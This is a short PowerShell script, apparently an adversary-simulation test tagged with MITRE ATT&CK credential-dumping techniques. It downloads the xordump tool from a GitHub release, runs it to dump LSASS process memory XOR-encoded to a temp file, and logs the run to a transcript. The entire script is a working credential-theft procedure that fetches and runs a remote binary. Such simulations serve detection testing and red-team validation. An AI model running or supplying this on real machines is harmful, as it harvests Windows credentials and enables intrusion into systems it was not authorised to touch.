<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    Dump lsass with xordmp.exe (Dump LSASS.exe using imported Microsoft DLLs)
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

# Download and execute xordump.exe
$url = "https://github.com/audibleblink/xordump/releases/download/v0.0.2/xordump.exe"
$outfile = "$env:tmp\xordmp.exe"
$dumpfile = "$env:tmp\xordump_lsass_dump.dmp"
try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: xordump downloaded to $outfile"
        &"$outfile" -out $dumpfile -x 0x41
    }
    else{
        Write-Host -ForegroundColor Red "Error: xordump not found, download failed"
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Dumped lsass.exe memory to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to Dump lsass.exe memory to $dumpfile"
    }
}
catch {
    Write-Error $_
}

Stop-Transcript
